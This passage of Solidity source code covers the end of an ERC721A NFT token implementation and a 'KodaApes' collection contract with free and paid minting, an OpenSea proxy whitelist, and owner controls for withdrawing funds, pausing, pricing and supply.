1097         if (quantity == 0) revert MintZeroQuantity();
1098 
1099         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1100 
1101         // Overflows are incredibly unrealistic.
1102         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1103         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1104         unchecked {
1105             _addressData[to].balance += uint64(quantity);
1106             _addressData[to].numberMinted += uint64(quantity);
1107 
1108             _ownerships[startTokenId].addr = to;
1109             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1110 
1111             uint256 updatedIndex = startTokenId;
1112             uint256 end = updatedIndex + quantity;
1113 
1114             if (safe && to.isContract()) {
1115                 do {
1116                     emit Transfer(address(0), to, updatedIndex);
1117                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1118                         revert TransferToNonERC721ReceiverImplementer();
1119                     }
1120                 } while (updatedIndex != end);
1121                 // Reentrancy protection
1122                 if (_currentIndex != startTokenId) revert();
1123             } else {
1124                 do {
1125                     emit Transfer(address(0), to, updatedIndex++);
1126                 } while (updatedIndex != end);
1127             }
1128             _currentIndex = updatedIndex;
1129         }
1130         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1131     }
1132 
1133     /**
1134      * @dev Transfers `tokenId` from `from` to `to`.
1135      *
1136      * Requirements:
1137      *
1138      * - `to` cannot be the zero address.
1139      * - `tokenId` token must be owned by `from`.
1140      *
1141      * Emits a {Transfer} event.
1142      */
1143     function _transfer(
1144         address from,
1145         address to,
1146         uint256 tokenId
1147     ) private {
1148         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1149 
1150         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1151             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1152             getApproved(tokenId) == _msgSender());
1153 
1154         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1155         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1156         if (to == address(0)) revert TransferToZeroAddress();
1157 
1158         _beforeTokenTransfers(from, to, tokenId, 1);
1159 
1160         // Clear approvals from the previous owner
1161         _approve(address(0), tokenId, prevOwnership.addr);
1162 
1163         // Underflow of the sender's balance is impossible because we check for
1164         // ownership above and the recipient's balance can't realistically overflow.
1165         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1166         unchecked {
1167             _addressData[from].balance -= 1;
1168             _addressData[to].balance += 1;
1169 
1170             _ownerships[tokenId].addr = to;
1171             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1172 
1173             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1174             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1175             uint256 nextTokenId = tokenId + 1;
1176             if (_ownerships[nextTokenId].addr == address(0)) {
1177                 // This will suffice for checking _exists(nextTokenId),
1178                 // as a burned slot cannot contain the zero address.
1179                 if (nextTokenId < _currentIndex) {
1180                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1181                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1182                 }
1183             }
1184         }
1185 
1186         emit Transfer(from, to, tokenId);
1187         _afterTokenTransfers(from, to, tokenId, 1);
1188     }
1189 
1190     /**
1191      * @dev Destroys `tokenId`.
1192      * The approval is cleared when the token is burned.
1193      *
1194      * Requirements:
1195      *
1196      * - `tokenId` must exist.
1197      *
1198      * Emits a {Transfer} event.
1199      */
1200     function _burn(uint256 tokenId) internal virtual {
1201         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1202 
1203         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1204 
1205         // Clear approvals from the previous owner
1206         _approve(address(0), tokenId, prevOwnership.addr);
1207 
1208         // Underflow of the sender's balance is impossible because we check for
1209         // ownership above and the recipient's balance can't realistically overflow.
1210         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1211         unchecked {
1212             _addressData[prevOwnership.addr].balance -= 1;
1213             _addressData[prevOwnership.addr].numberBurned += 1;
1214 
1215             // Keep track of who burned the token, and the timestamp of burning.
1216             _ownerships[tokenId].addr = prevOwnership.addr;
1217             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1218             _ownerships[tokenId].burned = true;
1219 
1220             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1221             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1222             uint256 nextTokenId = tokenId + 1;
1223             if (_ownerships[nextTokenId].addr == address(0)) {
1224                 // This will suffice for checking _exists(nextTokenId),
1225                 // as a burned slot cannot contain the zero address.
1226                 if (nextTokenId < _currentIndex) {
1227                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1228                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1229                 }
1230             }
1231         }
1232 
1233         emit Transfer(prevOwnership.addr, address(0), tokenId);
1234         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1235 
1236         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1237         unchecked {
1238             _burnCounter++;
1239         }
1240     }
1241 
1242     /**
1243      * @dev Approve `to` to operate on `tokenId`
1244      *
1245      * Emits a {Approval} event.
1246      */
1247     function _approve(
1248         address to,
1249         uint256 tokenId,
1250         address owner
1251     ) private {
1252         _tokenApprovals[tokenId] = to;
1253         emit Approval(owner, to, tokenId);
1254     }
1255 
1256     /**
1257      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1258      *
1259      * @param from address representing the previous owner of the given token ID
1260      * @param to target address that will receive the tokens
1261      * @param tokenId uint256 ID of the token to be transferred
1262      * @param _data bytes optional data to send along with the call
1263      * @return bool whether the call correctly returned the expected magic value
1264      */
1265     function _checkContractOnERC721Received(
1266         address from,
1267         address to,
1268         uint256 tokenId,
1269         bytes memory _data
1270     ) private returns (bool) {
1271         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1272             return retval == IERC721Receiver(to).onERC721Received.selector;
1273         } catch (bytes memory reason) {
1274             if (reason.length == 0) {
1275                 revert TransferToNonERC721ReceiverImplementer();
1276             } else {
1277                 assembly {
1278                     revert(add(32, reason), mload(reason))
1279                 }
1280             }
1281         }
1282     }
1283 
1284     /**
1285      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1286      * And also called before burning one token.
1287      *
1288      * startTokenId - the first token id to be transferred
1289      * quantity - the amount to be transferred
1290      *
1291      * Calling conditions:
1292      *
1293      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1294      * transferred to `to`.
1295      * - When `from` is zero, `tokenId` will be minted for `to`.
1296      * - When `to` is zero, `tokenId` will be burned by `from`.
1297      * - `from` and `to` are never both zero.
1298      */
1299     function _beforeTokenTransfers(
1300         address from,
1301         address to,
1302         uint256 startTokenId,
1303         uint256 quantity
1304     ) internal virtual {}
1305 
1306     /**
1307      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1308      * minting.
1309      * And also called after one token has been burned.
1310      *
1311      * startTokenId - the first token id to be transferred
1312      * quantity - the amount to be transferred
1313      *
1314      * Calling conditions:
1315      *
1316      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1317      * transferred to `to`.
1318      * - When `from` is zero, `tokenId` has been minted for `to`.
1319      * - When `to` is zero, `tokenId` has been burned by `from`.
1320      * - `from` and `to` are never both zero.
1321      */
1322     function _afterTokenTransfers(
1323         address from,
1324         address to,
1325         uint256 startTokenId,
1326         uint256 quantity
1327     ) internal virtual {}
1328 }
1329 
1330 
1331 
1332 contract KodaApes is ERC721A, Owneable {
1333 
1334     string public baseURI = "";
1335     string public contractURI = "ipfs://QmQbgFVgj9kpEnRBLNgru7spgKJFH2VcAz9fvGLGC2CVYU/";
1336     string public constant baseExtension = "";
1337     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1338 
1339     uint256 public constant MAX_PER_TX_FREE = 1;
1340     uint256 public constant FREE_MAX_SUPPLY = 1000;
1341     uint256 public constant MAX_PER_TX = 20;
1342     uint256 public MAX_SUPPLY = 5000;
1343     uint256 public price = 0.0069 ether;
1344 
1345     bool public paused = false;
1346 
1347     constructor() ERC721A("KodaApes", "KODA") {}
1348 
1349     function mint(uint256 _amount) external payable {
1350         address _caller = _msgSender();
1351         require(!paused, "Paused");
1352         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1353         require(_amount > 0, "No 0 mints");
1354         require(tx.origin == _caller, "No contracts");
1355         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1356         
1357       if(FREE_MAX_SUPPLY >= totalSupply()){
1358             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1359         }else{
1360             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1361             require(_amount * price == msg.value, "Invalid funds provided");
1362         }
1363 
1364 
1365         _safeMint(_caller, _amount);
1366     }
1367 
1368     function isApprovedForAll(address owner, address operator)
1369         override
1370         public
1371         view
1372         returns (bool)
1373     {
1374         // Whitelist OpenSea proxy contract for easy trading.
1375         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1376         if (address(proxyRegistry.proxies(owner)) == operator) {
1377             return true;
1378         }
1379 
1380         return super.isApprovedForAll(owner, operator);
1381     }
1382 
1383     function withdraw() external onlyOwner {
1384         uint256 balance = address(this).balance;
1385         (bool success, ) = _msgSender().call{value: balance}("");
1386         require(success, "Failed to send");
1387     }
1388 
1389     function config() external onlyOwner {
1390         _safeMint(_msgSender(), 1);
1391     }
1392 
1393     function pause(bool _state) external onlyOwner {
1394         paused = _state;
1395     }
1396 
1397     function setBaseURI(string memory baseURI_) external onlyOwner {
1398         baseURI = baseURI_;
1399     }
1400 
1401     function setContractURI(string memory _contractURI) external onlyOwner {
1402         contractURI = _contractURI;
1403     }
1404 
1405     function setPrice(uint256 newPrice) public onlyOwner {
1406         price = newPrice;
1407     }
1408 
1409     function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1410         MAX_SUPPLY = newSupply;
1411     }
1412 
1413     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1414         require(_exists(_tokenId), "Token does not exist.");
1415         return bytes(baseURI).length > 0 ? string(
1416             abi.encodePacked(
1417               baseURI,
1418               Strings.toString(_tokenId),
1419               baseExtension
1420             )
1421         ) : "";
1422     }
1423 }
1424 
1425 contract OwnableDelegateProxy { }
1426 contract ProxyRegistry {
1427     mapping(address => OwnableDelegateProxy) public proxies;
1428 }